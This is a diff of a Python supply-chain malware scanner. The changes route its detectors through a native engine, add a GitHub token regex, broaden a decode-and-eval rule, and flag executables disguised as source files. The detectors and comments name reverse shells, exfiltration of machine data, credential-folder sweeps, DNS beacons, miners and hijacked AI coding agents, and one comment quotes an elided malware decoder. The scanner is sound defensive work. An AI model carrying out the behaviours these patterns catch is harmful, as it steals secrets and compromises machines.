@@ -31,10 +31,11 @@ rejected rules, or that cannot be loaded at all, makes the scan exit 4, so CI
 cannot silently lose coverage; a repository config (--trust-repo-config) does
 the same only with --strict-taint-config.
 
-No dependencies — runs on stock python3. Same ruleset as the Lazaret dashboard.
+No dependencies — stock python3 and the native engine every wheel carries
+(lazaret/_native/; engine.py), which runs the detectors and the per-file
+rules. Same ruleset as the Lazaret dashboard.
 """
 import argparse
-import base64
 import bisect
 import collections
 import datetime
@@ -49,6 +50,7 @@ import re
 import sys
 import threading
 import time
+import types
 import unicodedata
 import warnings
 
@@ -64,6 +66,362 @@ from lazaret.scanner import configsecrets  # config and data files: credentials 
 from lazaret.scanner import autorun  # editor and AI-agent settings that run commands (SC-AUTORUN)
 from lazaret.scanner import ghworkflow  # the workflows the Shai-Hulud worms planted (SC-WORKFLOW-*)
 from lazaret.scanner import frameworks  # web framework models shared by both taint engines
+from lazaret.scanner import _native, engine  # the native engine: every detector below
+
+
+# ---------------- The engine's detectors ----------------
+# Since the Rust-first refactor the native engine (engine.py, the Rust crate
+# rust/crates/lazaret-engine) is the only implementation of the supply-chain
+# tests and of the per-file rules. These are its answers under the names
+# the rest of the scanner, the registry and the tests call them by. Each
+# raises _native.NativeError when the engine cannot answer (its work budget
+# spent on a hostile input); the scans turn that into SC-TRUNCATED.
+
+def _ask(call, text, **args):
+    """The engine's answer to `call` on `text`."""
+    return _native.call(call, args, text)
+
+
+def _tuple(value):
+    """A JSON array as a tuple (None stays None)."""
+    return None if value is None else tuple(value)
+
+
+def install_script_risk(text, shell=True, command=False, lang=None):
+    """The reasons an install script is risky (read as a shell program too
+    unless `shell` is false; `command`: a hook's command line; `lang`: the
+    script's language when known, "js" or "py")."""
+    return engine.install_script_risk(text, shell, command, lang)
+
+
+def import_time_risk(text, lang=None):
+    """(reasons, line): the import-time test of a dependency's file."""
+    return engine.import_time_risk(text, lang)
+
+
+def import_time_severity(reasons):
+    """'CRITICAL' when one of the reasons is a strong one, else 'MAJOR'."""
+    return _ask("import_time_severity", "", reasons=list(reasons))
+
+
+def follow_hook(cmd):
+    """(the package files an install hook's command runs, whether the walk
+    read all of it)."""
+    targets, complete = _ask("follow_hook", cmd)
+    return targets, complete
+
+
+def hook_script_targets(cmd):
+    """The files an install hook runs (follow_hook's targets)."""
+    return follow_hook(cmd)[0]
+
+
+def _hook_tokens(cmd):
+    """The words of a hook's command, as the follower reads them."""
+    return _ask("hook_tokens", cmd)
+
+
+def node_candidates(rel):
+    """The files `node rel` may run, in Node's order."""
+    return _ask("node_candidates", rel)
+
+
+def shebang_lang(text):
+    """'js', 'py' or 'sh' by the script's #! line, else None."""
+    return _ask("shebang_lang", text)
+
+
+def decoded_view(text, lang=None):
+    """`text` with what it decodes as it runs written out (hex, base64, char
+    codes, string arrays, its own decoders; in JavaScript and Python, `lang`,
+    its literals read as the runtime reads them)."""
+    return _ask("decoded_view", text, **({"lang": lang} if lang else {}))
+
+
+def string_array_line(text, lang=None):
+    """The line of the string array the decoded view read, else None."""
+    return _ask("string_array_line", text, **({"lang": lang} if lang else {}))
+
+
+def spawned_scripts(text, lang=None):
+    """[(base, path)] of the package scripts `text` starts with node or python."""
+    return engine.spawned_scripts(text, lang)
+
+
+def self_publish_at(text):
+    """The offset of code that publishes packages with a token, else -1."""
+    return _ask("self_publish_at", text)
+
+
+def runs_dll(text):
+    """The DLL an install script runs, else None."""
+    return _ask("runs_dll", text)
+
+
+def join_string_pieces(text):
+    """`text` with literal pieces joined with + written as one."""
+    return _ask("join_string_pieces", text)
+
+
+def _received_code_kind(text, extra_always=(), extra_runners=()):
+    """(line, kind) of code received over the network and run, else None."""
+    args = {}
+    if extra_always:
+        args["extra_always"] = sorted(extra_always)
+    if extra_runners:
+        args["extra_runners"] = sorted(extra_runners)
+    return _tuple(_native.call("received_code_kind", args, text))
+
+
+def runs_received_code(text):
+    """The line of code received over the network and run, else None."""
+    return _ask("runs_received_code", text)
+
+
+def _downloads_and_runs(text):
+    """(line, interpreter) of a download written to a file and run, else None."""
+    return _tuple(_ask("downloads_and_runs", text))
+
+
+def _decodes_and_runs(text):
+    """(line, interpreter) of a decoded payload written to a file and run, else None."""
+    return _tuple(_ask("decodes_and_runs", text))
+
+
+def powershell_risk(text):
+    """The reasons PowerShell in `text` is risky."""
+    return _ask("powershell_risk", text)
+
+
+def stager_at(text):
+    """The offset of a stager (a download run in memory), else -1."""
+    return _ask("stager_at", text)
+
+
+def reverse_shell_at(text):
+    """The offset of a reverse shell, else -1."""
+    return _ask("reverse_shell_at", text)
+
+
+def local_data_sent_at(text):
+    """(offset, kind, what, in_address) of the first send of data read from
+    the machine, else None."""
+    return _tuple(_ask("local_data_sent_at", text))
+
+
+def runs_own_source_at(text):
+    """The offset of a runner of code read from the file itself or a data
+    file next to it, else -1."""
+    return _ask("runs_own_source_at", text)
+
+
+def reads_own_source(text):
+    """Does `text` read its own source?"""
+    return _ask("reads_own_source", text)
+
+
+def persistence_reasons(text):
+    """The places `text` writes to that run code later (persistence)."""
+    return _ask("persistence_reasons", text)
+
+
+def dumps_workflow_secrets(text):
+    """Does `text` write a workflow that dumps the repository's secrets?"""
+    return _ask("dumps_workflow_secrets", text)
+
+
+def _pipes_download_to_shell(text):
+    """Does `text` pipe a download into a shell?"""
+    return _ask("pipes_download_to_shell", text)
+
+
+def runs_substituted_download(row):
+    """Does the row run a download substituted into a command line?"""
+    return _ask("runs_substituted_download", row)
+
+
+def offscreen_code(line, lang):
+    """(column, blanks, hidden code, runs code) of code pushed past the
+    screen's edge, else None."""
+    return _tuple(_ask("offscreen_code", line, lang=lang))
+
+
+def _lex_comment_spans(content, lang, strings=None, jsx=True, literals=None):
+    """Absolute (start, end) spans of every comment in `content`; with
+    `strings` and `literals` lists, the spans of the string literals and of
+    every literal are appended to them. jsx=False: a .ts file."""
+    if lang == "cfg":                       # a config or data file (configsecrets)
+        return configsecrets.comment_spans(content)
+    args = {"jsx": jsx, "strings": strings is not None, "literals": literals is not None}
+    if lang in ("py", "js", "sql"):
+        args["lang"] = lang
+    got = _native.call("lex_comment_spans", args, content)
+    if strings is not None:
+        strings.extend(tuple(s) for s in got["strings"])
+    if literals is not None:
+        literals.extend(tuple(s) for s in got["literals"])
+    return [tuple(s) for s in got["comments"]]
+
+
+def secret_endpoint_at(text):
+    """(offset, reason) of a request to a webhook whose secret is written in
+    the code, else None."""
+    return _tuple(_ask("secret_endpoint_at", text))
+
+
+def credential_sweep_at(text):
+    """(offset, names) of three or more credential folders named in one
+    place, else None."""
+    return _tuple(_ask("credential_sweep_at", text))
+
+
+def exec_command_reasons(text):
+    """The reasons the command lines `text` hands a shell give."""
+    return _ask("exec_command_reasons", text)
+
+
+def dns_beacon_at(text, host=True):
+    """The offset of a DNS lookup of a name built from the machine's
+    identity, else -1 (host=False: without another read of the identity)."""
+    return _native.call("dns_beacon_at", {} if host else {"host": False}, text)
+
+
+def miner_at(text):
+    """The offset of a cryptocurrency miner's wallet and pool, else -1."""
+    return _ask("miner_at", text)
+
+
+def raw_ip_connect(text):
+    """The hard-coded address a raw socket connects to, else None."""
+    return _ask("raw_ip_connect", text)
+
+
+def capture_service(text):
+    """The data-capture service `text` names (the matched text), else None."""
+    return _ask("capture_service", text)
+
+
+def exfil_signs(text):
+    """The exfiltration signs of `text` (its view of the machine's data and
+    where it goes)."""
+    return _ask("exfil_signs", text)
+
+
+def service_reasons(text):
+    """The programs `text` sets to start at login or boot."""
+    return _ask("service_reasons", text)
+
+
+def wallet_swap_at(text):
+    """(offset, reason) of a wallet address swapped for the script's own,
+    else None."""
+    return _tuple(_ask("wallet_swap_at", text))
+
+
+def sh_reasons(text):
+    """The reasons a shell text, read as a program, sends data, downloads
+    and runs code or beacons (as an install hook's command is read)."""
+    return _ask("sh_reasons", text)
+
+
+def sh_parse(text):
+    """The simple commands of a shell text, each with its words, the
+    substitutions in each word, its redirections, whether it is piped in and
+    out, what follows it, and its program: (word index or None, name,
+    negated)."""
+    out = []
+    for words, subs, redirs, pipe_in, pipe_out, after, program in _ask("sh_parse", text):
+        out.append(types.SimpleNamespace(words=words, subs=[tuple(x) for x in subs],
+                                         redirs=[tuple(x) for x in redirs], pipe_in=pipe_in, pipe_out=pipe_out,
+                                         after=after, program=tuple(program)))
+    return out
+
+
+def _shell_text(text):
+    """Is `text` a shell program?"""
+    return _ask("shell_text", text)
+
+
+def _code_text(text):
+    """Is `text` code (not a shell program)?"""
+    return _ask("code_text", text)
+
+
+def _sh_literal_value(text, i):
+    """The value of the string literal at text[i], else None."""
+    return _ask("sh_literal_value", text, at=i)
+
+
+def dead_drop_at(text):
+    """(offset, host) of the machine's name sent to an address fetched at
+    run time, else None."""
+    return _tuple(_ask("dead_drop_at", text))
+
+
+def agent_hijack(text):
+    """(agent, flag, line) of an AI coding agent launched in an autonomous
+    mode, else None."""
+    return _tuple(_ask("agent_hijack", text))
+
+
+def agent_hijack_in_command(cmd):
+    """(agent, flag) of an AI coding agent launched in an autonomous mode
+    by a command line, else None."""
+    return _tuple(_ask("agent_hijack_in_command", cmd))
+
+
+def hook_command_risk(cmd, output_kept=False):
+    """The reasons an install hook's command, read as a program, is risky."""
+    return _native.call("hook_command_risk", {"output_kept": True} if output_kept else {}, cmd)
+
+
+def _hook_is_suspicious(cmd):
+    """Is an install hook's command suspicious on its face?"""
+    return _ask("hook_is_suspicious", cmd)
+
+
+def _import_code(text, lang):
+    """`text` as the import-time test reads it (what runs at import)."""
+    return _ask("import_code", text, lang=lang)
+
+
+def hex_hidden_name(line):
+    """(name, column) of a dangerous name written in escapes, else None."""
+    return _tuple(_ask("hex_view", line)[0])
+
+
+def hex_hidden_text(line):
+    """Readable text hidden in escapes, else None."""
+    return _ask("hex_view", line)[1]
+
+
+def lookalike_name(code, lang, words):
+    """(name, what it reads as, severity, another name of the file reads so,
+    detail, column) of a look-alike name, else None (`words`: the file's
+    names, or a function giving them)."""
+    names = words() if callable(words) else words
+    args = {"words": sorted(names)}
+    if lang is not None:
+        args["lang"] = lang
+    return _tuple(_native.call("lookalike_view", args, code))
+
+
+def scan_rules(path, content, lang):
+    """The rules part of project mode's scan of one file (the pattern rules,
+    the families, the whole-text rules), before the passes that follow."""
+    args = {"lang": lang, "jsx": jsx_reading(path), "redact": bool(REDACT_SECRETS), "neumaier": False}
+    return engine._issues(path, _native.call("scan_rules", args, content))
+
+
+def scan_file(path, content, lang, dep=False):
+    """The findings of one file: in dependency mode the engine's, in project
+    mode the engine's rules part and the passes that follow (engine.scan_file)."""
+    return engine.scan_file(path, content, lang, dep)
+
+
+def _cross_file_received_issues(files, skip_paths=(), who="Dependency code", one_package=False, site_groups=None):
+    """The cross-file follower's findings (engine.cross_file_issues)."""
+    return engine.cross_file_issues(files, skip_paths, who, one_package, site_groups)
 
 
 def configure_stdio():
@@ -92,6 +450,7 @@ def configure_stdio():
         except (OSError, ValueError):
             pass
 
+
 # ---------------- Rules (mirrors lazaret.html) ----------------
 SEV_ORDER = {"BLOCKER": 0, "CRITICAL": 1, "MAJOR": 2, "MINOR": 3, "INFO": 4}
 TYPE_LABEL = {"VULN": "Vulnerability", "HOTSPOT": "Security Hotspot",
@@ -119,8 +478,9 @@ _JWT_CHARS = frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123
 _JWT_RUN_RE = re.compile(r"[A-Za-z0-9_\-]*")
 _JWT_CANDIDATE_RE = re.compile(r"(?<![A-Za-z0-9_\-])(?=[A-Za-z0-9_\-]{13,}\.eyJ[A-Za-z0-9_\-]{10})")
 _TOKEN_ALTS = (       # S-TOKEN, in pattern order
-    r"AKIA[0-9A-Z]{16}", r"gh[pousr]_[A-Za-z0-9]{36}", r"xox[baprs]-[A-Za-z0-9-]{10,}",
-    r"sk_live_[A-Za-z0-9]{16,}", r"AIza[0-9A-Za-z_\-]{35}", r"-----BEGIN [A-Z ]*PRIVATE KEY-----", _JWT_ALT)
+    r"AKIA[0-9A-Z]{16}", r"gh[pousr]_[A-Za-z0-9]{36}", r"github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59}",
+    r"xox[baprs]-[A-Za-z0-9-]{10,}", r"sk_live_[A-Za-z0-9]{16,}", r"AIza[0-9A-Za-z_\-]{35}",
+    r"-----BEGIN [A-Z ]*PRIVATE KEY-----", _JWT_ALT)
 _TOKEN_REDACT_ALTS = (    # the redaction list's first pattern (_SECRET_LINE_PATTERNS[0])
     r"AKIA[0-9A-Z]{16}", r"gh[pousr]_[A-Za-z0-9]{36,}", r"github_pat_[A-Za-z0-9_]{22,}",
     r"xox[baprs]-[A-Za-z0-9-]{10,}", r"sk_live_[A-Za-z0-9]{16,}", r"AIza[0-9A-Za-z_\-]{35}",
@@ -181,6 +541,7 @@ class _TokenPattern:
 
     def __init__(self, alternatives):
         assert alternatives[-1] == _JWT_ALT
+        self.alternatives = tuple(alternatives)
         self.pattern = "|".join(alternatives)
         self.flags = re.compile(self.pattern).flags
         self._others = re.compile("|".join(alternatives[:-1]))
@@ -600,25 +961,29 @@ R("SC-EVAL-DECODE", "Decoded payload execution", "VULN", "BLOCKER", ("py", "js")
   "Decode-then-execute is the signature pattern of malware droppers and supply-chain implants.",
   "Treat as hostile until proven otherwise; inspect the decoded payload.",
   "CWE-506 · Supply chain"),
-R("SC-PACKER", "Packed JavaScript (p,a,c,k,e,d)", "VULN", "CRITICAL", ("js",),
+# (0.1.8: MAJOR, a tool's mark; a packed payload that runs is SC-EVAL-DECODER's)
+R("SC-PACKER", "Packed JavaScript (p,a,c,k,e,d)", "VULN", "MAJOR", ("js",),
   r"eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e",
   "Dean Edwards packer signature — self-decoding packed code.",
   "Legitimate modern packages ship minified, not packed; packing hides intent.",
   "Unpack and review the payload before trusting this file.",
   "CWE-506 · Supply chain"),
-# eval of what a function written into the call decodes from a long encoded
-# literal (0.1.8): the 2026 wave that compromised awaitly, executable-stories-
-# vitest and three @redhat-cloud-services packages shipped a 4 MB index.js of
-# `try{eval(function(s,n){…String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)…}
-# ([40,107,99,…], n))}catch(e){}` — a letter shift over character codes, run
-# as the package loads or installs. SC-PACKER's general case: any decoder
-# function, over at least 200 character codes or 1,000 characters of text.
-# None of the benchmark's 429 popular packages has one.
+# Code a function computes from a long literal, run (0.1.8): eval, Function or
+# vm's runIn…Context handed what a function — written into the call, or
+# named — returns for a blob of at least 200 character codes or 1,000
+# characters of text. The 2026 wave that compromised awaitly, executable-
+# stories-vitest and three @redhat-cloud-services packages shipped a 4 MB
+# index.js of `try{eval(function(s,n){…String.fromCharCode((c.charCodeAt(0)-
+# b+n)%26+b)…}([40,107,99,…], n))}catch(e){}`; Dean Edwards' packer is
+# eval(function(p,a,c,k,e,d){…}('<payload>', …)). Whatever the decoder, the
+# file shows it, never the code it runs. None of the benchmark's 429
+# popular packages has one.
 R("SC-EVAL-DECODER", "Code decoded by its own function and run", "VULN", "CRITICAL", ("js",),
-  r"\beval\s*\(\s*\(?\s*function\s*\([^()]{0,80}\)\s*\{(?:[^{}]|\{[^{}]{0,2000}\}){0,2000}\}\s*\)?\s*\(\s*"
+  r"\b(?:eval|(?:new\s+)?Function|runIn(?:This|New)?Context)\s*\(\s*(?:\(?\s*function\s*\([^()]{0,80}\)\s*\{"
+  r"(?:[^{}]|\{[^{}]{0,2000}\}){0,2000}\}\s*\)?|[A-Za-z_$][\w$]*)\s*\(\s*"
   r"(?:\[\s*\d+(?:\s*,\s*\d+){199}|'[^'\n]{1000}|\"[^\"\n]{1000}|`[^`]{1000})",
-  "eval runs what a function written into the call decodes from a long encoded literal.",
-  "An inline decoder over a blob of character codes or text keeps a payload out of sight: the file shows the "
+  "Code a function computes from a long literal is run (eval, Function or vm).",
+  "A decoder over a blob of character codes or text keeps a payload out of sight: the file shows the "
   "decoder, never the code it runs.",
   "Decode the blob and read what it runs; treat the package as hostile until then.",
   "CWE-506 · Supply chain"),
@@ -763,6 +1128,7 @@ R("SQL-UPDATE-NOWHERE", "UPDATE without WHERE", "BUG", "MAJOR", ("sql",),
   "Add a WHERE clause to scope the update.",
   "CWE-665", flags=re.I),
 ]
+
 
 # ---------------- Taint tracking (lightweight, intra-file) ----------------
 # Sources: user input and decode functions. Sinks: dangerous calls.
@@ -1180,19 +1546,11 @@ _CAT_META = {  # category -> (severity, cwe, fix) for intra-file sink rows
 #: exit 2, EXIT_OUTPUT's 3 and the internal-error exit 5.
 EXIT_TAINT_CONFIG = 4
 
-#: The complete set of sink categories a taint config may use (sorted for
-#: stable warning/report text). Kept in sync with _CAT_META / _SUFFIX_BY_CATEGORY.
-VALID_CATEGORIES = tuple(sorted(_CAT_META))
-
 # Validation warnings from the most recent apply_taint_config() call: every
 # rule the loader refused. Rules are never silently dropped — a custom sink
 # that fails validation must not quietly become inert while the scan still
 # reports PASSED (the bug this fixes). The CLI drains these after loading.
 _TAINT_CONFIG_WARNINGS = []
-
-
-def _taint_config_warn(msg):
-    _TAINT_CONFIG_WARNINGS.append(msg)
 
 
 def get_taint_config_warnings():
@@ -1739,7 +2097,6 @@ _ROUTE_RULE_RE = re.compile(r"""\(\s*[rRuU]?(["'])(.*?)\1""")
 _DEF_HEAD_RE = re.compile(r"^\s*(?:async\s+)?def\s+\w+\s*\(")
 _PARAM_RE = re.compile(r"\s*\*{0,2}\s*([A-Za-z_]\w*)\s*")
 _top_split = frameworks.top_split
-_safe_type = frameworks.safe_type
 
 
 def _signature_params(sig):
@@ -2131,6 +2488,7 @@ def taint_scan(path, lines, lang, ctx=None):
                 report(xss_sink[0], *xss_sink[2:], value, i, rm.end() - 6)
     return issues
 
+
 # ---------------- Obfuscation / entropy heuristics ----------------
 import math
 
@@ -2143,8 +2501,6 @@ def shannon_entropy(s):
     return -sum((n / len(s)) * math.log2(n / len(s)) for n in freq.values())
 
 ENTROPY_VALUE_RE = re.compile(r"[=:]\s*[\"']([A-Za-z0-9+/=_\-]{20,})[\"']")
-B64_BLOB_RE = re.compile(r"[\"'][A-Za-z0-9+/]{200,}={0,2}[\"']")
-CHARCODE_RE = re.compile(r"String\.fromCharCode")
 OBF_IDENT_RE = re.compile(r"\b_0x[0-9a-f]{4,}\b")
 # Verdict-integrity fix (audit C2/G2): the bare word `test` matched anywhere on
 # the line — including in a comment — and silently disabled every entropy/secret
@@ -2167,6 +2523,7 @@ def entropy_secretish(v):
     if not (any(c.isdigit() for c in v) or any(c in "+=" for c in v)):
         return False
     return shannon_entropy(v) > 4.0
+
 
 # ---------------- Inline suppression ----------------
 # Marker grammar (review fix, shared semantics 2): `#`, `//` or `--`, optional
@@ -2302,6 +2659,7 @@ def is_suppressed(issue, lines, lang=None, dep=False):
     if ctx is None or ctx.lang != lang:
         ctx = _FileCtx(lines, lang)
     return _suppressed_in(issue, ctx)
+
 
 # ---------------- Binary / compiled-artifact detection ----------------
 # Source packages (sdists, npm tarballs, repos) should ship reviewable source,
@@ -2516,6 +2874,39 @@ def classify_binary(path, data, size, context):
                 "Identify what this file is and why it ships; reject unexplained binary blobs.")
     return None
 
+
+_DISGUISED_WHY = ("A source file is read, reviewed and diffed as text; a program under a source file's "
+                  "name hides from that review and from every rule that reads code. No build ships one: "
+                  "compiled code goes in files named for what they are (.so, .pyd, .node, .exe).")
+_DISGUISED_FIX = ("Treat the package or tree that ships it as compromised: find what loads or runs the "
+                  "file, and remove it.")
+#: The leading bytes disguised_binary reads: an oversized source file's prefix
+#: is read this far (the header test reads the first 512).
+DISGUISE_SAMPLE_BYTES = 2048
+
+
+def disguised_binary(path, data):
+    """SC-BINARY, CRITICAL, for a program under a source file's name (0.1.8):
+    an executable's or a compiled module's bytes (EXEC_MAGIC, a Windows PE)
+    in a file named as source code: a registry or guard member, a file of a
+    directory scan (`--deps` too) or one an MCP client names. Unlike a
+    binary named for what it is (classify_binary: inventory in a wheel, a
+    capability to review elsewhere) it is a disguise, in a wheel too:
+    num2words 0.5.15's `_build.py` is a Windows executable. Else None.
+    Twin: js/src/lib/binary.js disguisedBinary."""
+    data = bytes(data or b"")
+    header = data[:512]
+    desc = next((d for sig, d in EXEC_MAGIC if header.startswith(sig)), None)
+    if desc is None and header.startswith(b"MZ"):
+        desc = "Windows PE executable/DLL"
+    if desc is None or not looks_binary(data[:DISGUISE_SAMPLE_BYTES]):
+        return None
+    return {"rule": "SC-BINARY", "name": "Binary artifact in package", "type": "HOTSPOT", "sev": "CRITICAL",
+            "msg": f"{os.path.basename(path)} is not source code but a program: {desc}.",
+            "why": _DISGUISED_WHY, "fix": _DISGUISED_FIX, "ref": "CWE-506 · Supply chain",
+            "file": path, "line": 1, "snippet": [], "snipStart": 1}
+
+
 # ---------------- Truncation accounting (verdict integrity, audit C2/G16) ----------------
 # Every place scanning is cut short must emit a signal, never a silent skip:
 # a file that was not scanned cannot be a data point for a clean verdict.
@@ -2535,8 +2926,6 @@ def truncated_issue(path, detail, sev="CRITICAL", rule="SC-TRUNCATED", name="Sca
             "fix": "Review the file manually or raise the limit and re-scan.",
             "ref": "CWE-506 · Supply chain", "file": path, "line": 1,
             "snippet": [], "snipStart": 1}
-
-LONG_LINE = 160
 FN_LEN_LIMIT = 60
 FN_CX_LIMIT = 12
 FN_HEADER_SCAN_LIMIT = 2000   # chars of a JS line searched for a function header
@@ -2642,552 +3031,8 @@ def skipped_tree_issues(skipped=None):
     defaults to the trees recorded by the most recent collect_files()."""
     return [_skipped_issue(*t) for t in (_SKIPPED_TREES if skipped is None else skipped)]
 
+
 # ---------------- Comment lexer (review fix: shared semantics 1) ----------------
-# is_comment() used to be a line-local prefix test: any JS/SQL line starting
-# with "/*" or "*" counted as a comment, so `/**/eval(atob(…))`, a minified
-# bundle opening with a `/*! lib | MIT */` banner, `/* x */ GRANT ALL … TO
-# PUBLIC;` or a `  * eval(…)` continuation line were skipped by every rule.
-# Comment state is now tracked ACROSS lines by a small lexer that knows the
-# language's strings and comments; a line is a comment line only if every
-# non-whitespace character on it is inside a comment.
-#
-# Fail closed where the same text reads two ways (review): a character is a
-# comment only if BOTH readings of its language say so, so code that some
-# runtime executes is never hidden as a comment, and a string can never pass
-# for a comment holding a suppression marker. Each file is lexed twice and
-# the comment spans (and, for JavaScript, the '…' "…" string spans; for
-# SC-HOMOGLYPH, every literal's span) are intersected:
-#   py : the lexer below, and again with f-strings (and t-strings) as
-#        Python 3.12+ reads them (PEP 701): a replacement field may hold
-#        strings in the same quotes, comments and newlines, and nothing in an
-#        f-string is a comment. Python's own tokenizer is not used: it differs
-#        across the supported versions (a comment line in a triple-quoted
-#        f-string's field is a COMMENT on 3.12+ only; an unterminated string
-#        ends a line on 3.10/3.11 and fails the whole file on 3.12+), and the
-#        npm engine cannot run it.
-#   js : the lexer below, and again reading JSX (not in .ts files, where
-#        TypeScript parses none): in element text `//` and `/*` are text
-#        (`<p>see /api/*</p>` opened a block comment that hid the rest of the
-#        file) and attribute strings have no escapes; `{…}` holds code again.
-#        An element starts at `<` + a tag name (or `>`) where an expression may
-#        start: the regex positions below, after `default`, `)` or `]`. Text
-#        no JSX toolchain accepts ends that reading at once (a `>` or `}` in
-#        element text, anything but attributes in a tag), so a TypeScript
-#        `<T>(x: T) => x` is code again at its `=>`.
-#   sql: the lexer below (standard SQL), and again as MySQL reads it:
-#        backslash escapes in '…' and "…", `…` quoted names, and `/*! … */`
-#        (`/*M! … */`) is code MySQL executes (a mysqldump line
-#        `('O\'Brien','src/*.js');` opened a comment that hid the next GRANT).
-#
-# Lexer semantics (mirrored by the JS engine):
-#   py : '#' to end of line; '…' "…" end at end of line unless the newline is
-#        backslash-escaped; '''…''' """…""" span lines; backslash escapes.
-#   js : '//' to end of line; '/* … */' spans lines; '…' "…" as in py;
-#        `…` template literals span lines (${…} is not re-lexed); a '/' that
-#        starts a regex literal (previous significant code character is
-#        start-of-file or one of ( , = : [ ! & | ? { } ; + - * % < > ~ ^, or
-#        the previous word is return/typeof/instanceof/in/of/new/delete/void/
-#        throw/case/do/else/yield/await) consumes the literal /…/ up to its
-#        closing '/' on the same line (escapes and [classes] honoured); with no
-#        closing '/' on the line it is a plain division, and so is every
-#        later '/' on that line.
-#   sql: '--' to end of line; '/* … */' spans lines; '…' and "…" span lines,
-#        no backslash escapes ('' is two adjacent strings, same result).
-#   other/unknown (lang None): '#' and '//' line comments, '/* … */', and
-#        '…' "…" `…` strings ending at end of line (lexed once).
-# Unterminated block comments and strings run to end of file.
-
-_LEX_NEXT = {
-    "py": re.compile(r"[#'\"]"),
-    "js": re.compile(r"[/'\"`]"),
-    "sql": re.compile(r"--|/\*|['\"]"),
-    None: re.compile(r"#|/[/*]|['\"`]"),
-}
-_LEX_LINE_STR = {q: re.compile(q + r"(?:[^" + q + r"\\\n]|\\.)*" + q + "?", re.S)
-                 for q in ("'", '"', "`")}
-_LEX_STR = {
-    ("py", "'"): _LEX_LINE_STR["'"], ("py", '"'): _LEX_LINE_STR['"'],
-    ("py", "'''"): re.compile(r"'''(?:[^'\\]|\\.|'(?!''))*(?:'''|\Z)", re.S),
-    ("py", '"""'): re.compile(r'"""(?:[^"\\]|\\.|"(?!""))*(?:"""|\Z)', re.S),
-    ("js", "'"): _LEX_LINE_STR["'"], ("js", '"'): _LEX_LINE_STR['"'],
-    ("js", "`"): re.compile(r"`(?:[^`\\]|\\.)*`?", re.S),
-    ("sql", "'"): re.compile(r"'[^']*'?"), ("sql", '"'): re.compile(r'"[^"]*"?'),
-    (None, "'"): _LEX_LINE_STR["'"], (None, '"'): _LEX_LINE_STR['"'],
-    (None, "`"): _LEX_LINE_STR["`"],
-}
-# SQL as MySQL reads it
-_LEX_MYSQL_NEXT = re.compile(r"--|/\*|['\"`]")
-_LEX_MYSQL_STR = {"'": re.compile(r"'(?:[^'\\]|\\.)*'?", re.S),
-                  '"': re.compile(r'"(?:[^"\\]|\\.)*"?', re.S),
-                  "`": re.compile(r"`[^`]*`?")}
-_JS_REGEX_LIT_RE = re.compile(r"/(?![*/])(?:[^/\\\[\n]|\\.|\[(?:[^\]\\\n]|\\.)*\])+/")
-_JS_REGEX_PREV = frozenset("(,=:[!&|?{};+-*%<>~^")
-_JS_REGEX_KEYWORDS = frozenset((
-    "return", "typeof", "instanceof", "in", "of", "new", "delete", "void",
-    "throw", "case", "do", "else", "yield", "await"))
-
-
-def _is_word_char(ch):
-    return ch.isalnum() or ch in "_$"
-
-
-def _js_regex_allowed(prev, tail, keywords=_JS_REGEX_KEYWORDS):
-    """May a '/' after this code start a regex literal? `prev` is the last
-    significant code character ('' at start of file), `tail` the last few
-    code characters ending at it."""
-    if prev == "" or prev in _JS_REGEX_PREV:
-        return True
-    if _is_word_char(prev):
-        k = len(tail)
-        while k > 0 and _is_word_char(tail[k - 1]):
-            k -= 1
-        if k == 0 and len(tail) >= 11:     # word longer than any keyword
-            return False
-        return tail[k:] in keywords
-    return False
-
-
-def _intersect_spans(a, b):
-    """The (start, end) spans covered by both `a` and `b` (each sorted and
-    non-overlapping)."""
-    out = []
-    i = j = 0
-    while i < len(a) and j < len(b):
-        s = max(a[i][0], b[j][0])
-        e = min(a[i][1], b[j][1])
-        if s < e:
-            out.append((s, e))
-        if a[i][1] < b[j][1]:
-            i += 1
-        else:
-            j += 1
-    return out
-
-
-def _lex_comment_spans(content, lang, strings=None, jsx=True, literals=None):
-    """Absolute (start, end) spans of every comment in `content`: the spans
-    both readings of the language agree on (see the lexer notes above).
-    Linear: each reading finds the next interesting character with a regex
-    and consumes strings and comments with bounded matches. If `strings`
-    is a list, the '…' / "…" literal spans both JavaScript readings agree on
-    are appended to it; if `literals` is, the spans of every literal both
-    readings agree on: strings of any kind (f-strings, templates) and regex
-    literals. jsx=False: a .ts file (no JSX reading)."""
-    if lang == "cfg":                       # a config or data file (configsecrets)
-        return configsecrets.comment_spans(content)
-    lang = lang if lang in ("py", "js", "sql") else None
-    if lang is None or (lang == "js" and not jsx):
-        return _lex_pass(content, lang, strings, literals=literals)
-    sa = None if strings is None else []
-    sb = None if strings is None else []
-    la = None if literals is None else []
-    lb = None if literals is None else []
-    a = _lex_pass(content, lang, sa, literals=la)
-    b = (_lex_js_jsx(content, sb, lb) if lang == "js"
-         else _lex_pass(content, lang, sb, second=True, literals=lb))
-    if strings is not None:
-        strings.extend(_intersect_spans(sa, sb))
-    if literals is not None:
-        literals.extend(_intersect_spans(la, lb))
-    return _intersect_spans(a, b)
-
-
-def _lex_pass(content, lang, strings=None, second=False, literals=None):
-    """One reading of `content`: the lexer above, or with `second` the other
-    reading of Python (PEP 701 f-strings) or SQL (MySQL)."""
-    mysql = second and lang == "sql"
-    nxt = _LEX_MYSQL_NEXT if mysql else _LEX_NEXT[lang]
-    fstrings = second and lang == "py"
-    spans = []
-    n = len(content)
-    pos = 0
-    prev, tail = "", ""        # js: last significant code char / trailing code text
-    no_regex_until = -1        # js: a regex literal failed to close before here
-    while pos < n:
-        m = nxt.search(content, pos)
-        if m is None:
-            break
-        k = m.start()
-        if lang == "js" and k > pos:
-            seg = content[pos:k].rstrip()
-            if seg:
-                prev, tail = seg[-1], seg[-11:]
-        ch = content[k]
-        two = content[k:k + 2]
-        if ((ch == "#" and lang in ("py", None)) or (two == "//" and lang in ("js", None))
-                or (two == "--" and lang == "sql")):
-            e = content.find("\n", k)
-            e = n if e < 0 else e
-            spans.append((k, e))
-            pos = e
-            continue
-        if two == "/*" and lang != "py":
-            if mysql and (content.startswith("!", k + 2) or content.startswith("M!", k + 2)):
-                pos = k + 2                # MySQL executes /*! … */: its text is code
-                continue
-            e = content.find("*/", k + 2)
-            e = n if e < 0 else e + 2
-            spans.append((k, e))
-            pos = e
